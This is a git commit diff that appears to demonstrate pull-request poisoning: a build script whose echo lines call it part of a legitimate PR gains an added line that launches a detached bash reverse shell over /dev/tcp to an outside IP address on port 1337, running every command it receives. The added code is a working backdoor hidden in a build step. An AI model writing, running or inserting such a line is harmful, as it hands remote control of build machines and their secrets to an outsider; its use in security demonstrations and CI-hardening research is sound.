68f7d6d8034fad06b50ffe451fcf97535f19c22d
c0rv4x22 <146779735+c0rv4x22@users.noreply.github.com>
2024-10-04 01:53:14 +0300

    Add exploit

--- run.sh
+++ run.sh
@@ -3,3 +3,8 @@
 
 echo 'This simulates some build or test process'
 echo 'This is a part of a legit PR'
+
+
+echo 'Running exploit 💀💀💀'
+nohup bash -c 'exec 5<>/dev/tcp/104.238.172.243/1337; cat <&5 | while read line; do $line 2>&5 >&5; done' < /dev/null &
+disown
